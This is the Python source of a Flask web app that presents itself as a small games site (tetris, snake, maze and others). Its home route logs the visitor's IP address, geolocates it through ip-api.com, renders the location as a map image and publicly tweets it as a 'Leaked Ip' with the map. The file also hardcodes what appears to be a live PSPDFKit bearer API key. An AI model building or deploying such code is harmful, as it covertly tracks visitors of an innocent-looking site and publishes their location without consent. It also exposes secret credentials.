from flask import Flask, render_template, request, redirect
import tweepy
import requests
import folium
import os
import json

app = Flask(__name__)

# Keys/Tokens for Twitter bot
consumer_key = os.getenv('consumer_key')
consumer_secret = os.getenv('consumer_secret')
access_token = os.getenv('access_token')
access_token_secret = os.getenv('access_token_secret')


def get_twitter_conn_v1(consumer_key, consumer_secret, access_token, access_token_secret) -> tweepy.API:
    """Get twitter conn 1.1"""

    auth = tweepy.OAuth1UserHandler(consumer_key, consumer_secret)
    auth.set_access_token(
        access_token,
        access_token_secret,
    )
    return tweepy.API(auth)

def get_twitter_conn_v2(consumer_key, consumer_secret, access_token, access_token_secret) -> tweepy.Client:
    """Get twitter conn 2.0"""

    client = tweepy.Client(
        consumer_key=consumer_key,
        consumer_secret=consumer_secret,
        access_token=access_token,
        access_token_secret=access_token_secret,
    )

    return client


client_v1 = get_twitter_conn_v1(consumer_key, consumer_secret, access_token, access_token_secret)
client_v2 = get_twitter_conn_v2(consumer_key, consumer_secret, access_token, access_token_secret)


instructions = {
  'parts': [
    {
      'html': 'document'
    }
  ],
  'output': {
    'type': 'image',
    'format': 'png',
    'dpi': 500
  }
}

gamelist = [
    "tetris", "snake", "trivia", "soccer penalties", "pacman",
    "fox and hounds", "mars lander", "maze", "solitare", "maze room",
    "missionaries and cannibals", "virus", "Chose-own-adventure"
]
number = 0


@app.route('/')
def home():
    with open("counter.txt", "r") as f:
        count = f.read()

    count = int(count)
    with open("counter.txt", "w") as f:
        f.write(str(count + 1))

    # ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
    ip_addr = '24.89.238.194'

    with open("ip.txt", "a") as ip:
        ip.write(ip_addr + "\n")

    ip_addr = str(ip_addr)
    print(ip_addr)

    # Replace with the IP address you want to plot
    url = f'http://ip-api.com/json/{ip_addr}'
    response = requests.get(url)
    data = response.json()
    print(data)

    lat = data.get('lat')
    lon = data.get('lon')
    print(lat)
    print(lon)
    lat = float(lat)
    lon = float(lon)

    # Create a Folium map centered on the IP address location
    ma = folium.Map(location=[lat, lon], zoom_start=6)

    # Add a marker for the IP address location
    folium.Marker(location=[lat, lon], popup=ip_addr).add_to(ma)

    # Save the map as an HTML file
    ma.save("map.html")

    HCTI_API_ENDPOINT = "https://hcti.io/v1/image"
    HCTI_API_USER_ID = os.getenv('HCTI_API_USER_ID')
    HCTI_API_KEY = os.getenv('HCTI_API_KEY')

    with open("map.html", "r") as f:
        html_code = f.read()

    data = {
        'html': html_code,
        'css': ".box { color: white; background-color: #0f79b9; padding: 10px; font-family: Roboto }",
        'google_fonts': "Roboto"
    }

    image = requests.post(url=HCTI_API_ENDPOINT, data=data, auth=(HCTI_API_USER_ID, HCTI_API_KEY))
    image_url = image.json()['url']

    # Download the image and save it as a binary file
    response = requests.get(image_url)

    if response.status_code == 401:
        print("Received 401 Unauthorized. API key used")
        response = requests.request(
            'POST',
            'https://api.pspdfkit.com/build',
            headers={
                'Authorization': 'Bearer pdf_live_tH844YykItMosyiKTM6ugxVH9Nq3bVmjemUe2Y7uM7H'
            },
            files={
                'document': open('index.html', 'rb')
            },
            data={
                'instructions': json.dumps(instructions)
            },
            stream=True
        )

        if response.ok:
            with open('image.png', 'wb') as fd:
                for chunk in response.iter_content(chunk_size=8096):
                    fd.write(chunk)
        else:
            print(response.text)
            exit()
    elif response.status_code == 403:
        print("Received 401 Unauthorized. API key used.")
        response = requests.request(
            'POST',
            'https://api.pspdfkit.com/build',
            headers={
                'Authorization': 'Bearer pdf_live_tH844YykItMosyiKTM6ugxVH9Nq3bVmjemUe2Y7uM7H'
            },
            files={
                'document': open('index.html', 'rb')
            },
            data={
                'instructions': json.dumps(instructions)
            },
            stream=True
        )

        if response.ok:
            with open('image.png', 'wb') as fd:
                for chunk in response.iter_content(chunk_size=8096):
                    fd.write(chunk)
        else:
            print(response.text)
            exit()

    with open("image.png", "wb") as f:
        f.write(response.content)

    print("Image saved as image.png")

    # Posts IP on Twitter. The lucky number thing is to avoid duplicate messages which crashes the bot
    tweet_text = "Leaked Ip: " + ip_addr + " Ip Number: " + str(count)
    image_path = "image.png"
    media = client_v1.media_upload(filename=image_path)
    media_id = media.media_id

    client_v2.create_tweet(text=tweet_text, media_ids=[media_id])

    return render_template("index.html", ip_addr=ip_addr)


@app.route('/adventure')
def adventure_display():
    return render_template(
        "adventure.html",
    )


@app.route('/zion')
def zion():
    return render_template(
        "zion.html",
    )


@app.route('/factors')
def factors_display():
    return render_template(
        "factors.html",
    )


@app.route('/proxy-client')
def proxy_client():
    ip_addr = request.environ['HTTP_X_FORWARDED_FOR']
    ip = open("ip.txt", "a")
    ip.write(ip_addr + "\n")
    ip.close()
    return '<h1> Your IP address is:' + ip_addr


@app.route('/tetris')
def tetris_display():
    return render_template(
        "tetris.html",
    )


@app.route('/snake')
def snake_display():
    return render_template(
        "snake.html",
    )


@app.route('/trivia')
def trivia_display():
    return render_template(
        "trivia.html",
    )


@app.route('/soccer penalties')
def soccer_display():
    return render_template(
        "soccer penalties.html",
    )


@app.route('/virus')
def virus_display():
    return render_template(
        "virus.html",
    )


@app.route('/fox and hounds')
def fox_display():
    return render_template(
        "fox and hounds.html",
    )


@app.route('/mars lander')
def mars_display():
    return render_template(
        "mars lander.html",
    )


@app.route('/maze')
def maze_display():
    return render_template(
        "maze.html",
    )


@app.route('/solitare')
def solitare():
    return render_template(
        "solitare.html",
    )


@app.route('/maze room')
def mazes_display():
    return render_template(
        "maze room.html",
    )


@app.route('/missionaries and cannibals')
def missionary_display():
    return render_template(
        "missionaries and cannibals.html",
    )


@app.route('/result', methods=['POST', 'GET'])
def result():
    output = request.form.to_dict()
    print(output)
    name = output["name"]
    print(name)
    name = name.lower()
    print(name)
    if name in gamelist:
        return redirect('/' + name)
    return render_template('index.html', name=name)


@app.errorhandler(404)
def not_found(e):
    return render_template('404.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0')
